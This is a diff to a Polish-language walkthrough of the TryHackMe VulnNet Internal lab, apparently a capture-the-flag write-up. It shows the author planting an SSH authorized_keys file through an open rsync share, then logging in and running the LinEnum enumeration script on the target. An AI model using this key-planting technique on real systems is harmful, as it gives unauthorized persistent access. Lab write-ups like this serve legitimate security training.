@@ -374,9 +374,27 @@ rsync -r rsync://rsync-connect@10.10.120.63/files/ ./rsync
 Za pomoca polecenia ```ssh-keygen``` po wygenerowaniu kluczy publiczny i prywatrny zmieniam nazwe klucza publicznego za pomoca polecenia ```cp id-rsa.pub auhorized_keys```
 nastepnie kopiuje klucz publiczny poleceniem:
 ```
-rsync -r authorized_keys rsync://rsync-connect@10.10.40.161/files/sys-internal/
+┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
+└─$ rsync -r authorized_keys rsync://rsync-connect@10.10.240.197/files/sys-internal/.ssh/
 ```
-Podobnie robię z aplikacją ```LinEnum``` którą pobieram z [GitHub](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) poleceniem:
+
+Podobnie robię z aplikacją ```LinEnum``` którą pobieram z [GitHub](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) na własną maszynę poleceniem:
 ```
 git clone https://github.com/rebootuser/LinEnum.git
 ```
+Następnie za pomocą ```rsync``` kopiuję plik ```LinEnum.sh``` i jak już zaloguję się przez ssh za pomocą wcześniej utworzonych pary kluczy tworzę raport który pobieram w celu analizy.
+```
+┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
+└─$ rsync -r LinEnum.sh rsync://rsync-connect@10.10.240.197/files/sys-internal/.ssh/
+┌──(kali㉿kali)-[~/Desktop/TryHackMe/VulnNe_Internal]
+└─$ ssh -i id_rsa sys-internal@10.10.240.197
+
+sys-internal@vulnnet-internal:~$ ./LinEnum.sh -r raport.txt -e .
+```
+![coś_poszło_nie_tak](/screens/v_po_przerzuceniu_LinEnum.png)
+5. Po przejrzeniu raportu zaczyna interesować mnie usługa ```TimeCity```. Szperając po katalogach trafiam na katalog ```TimeCity``` i przyglądam mu się dokładniej.
+```
+TeamCity to narzędzie które wspiera budowanie i wdrażanie różnego rodzaju projektów. Po instalacji dostęp do internetowego interfejsu użytkownika TeamCity można uzyskać za pośrednictwem przeglądarki internetowej.
+```
+![ups!!!](/screens/v_kat_tc.png)
+
